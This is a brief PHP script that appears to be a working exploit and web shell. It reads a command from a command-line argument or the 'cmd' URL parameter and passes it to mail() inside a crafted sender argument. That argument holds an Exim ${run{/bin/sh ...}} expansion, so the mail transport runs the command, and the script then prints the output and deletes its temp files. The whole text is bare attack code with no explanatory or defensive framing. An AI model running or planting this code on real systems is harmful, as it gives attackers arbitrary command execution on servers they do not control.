<?php
$command_file = "/tmp/cmdMhhaJ8aM";
$output_file = "/tmp/outputMhhaJ8aM";
$cmd = $argv[1] ? $argv[1] : $_GET['cmd'];
$cmd = "$cmd > $output_file";

file_put_contents($command_file, $cmd);
mail("root@localhost", "aaa", "bbb", null,
     '-fwordpress@xenial(tmp1 -be ${run{/bin/sh${substr{10}{1}{$tod_log}}'.$command_file.'}} tmp2)');
echo file_get_contents($output_file);
unlink($output_file);
unlink($command_file);